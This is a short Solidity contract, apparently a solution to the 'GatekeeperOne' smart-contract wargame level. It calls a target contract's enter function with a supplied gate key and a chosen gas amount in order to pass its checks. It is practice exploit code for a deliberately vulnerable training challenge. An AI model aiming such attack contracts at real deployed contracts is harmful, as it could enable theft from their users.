// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGateKeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GateKeeperOneAttack {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function attack(bytes8 gateKey, uint256 gasToUse) public {
        IGateKeeperOne(target).enter{gas: gasToUse}(gateKey);
    }
}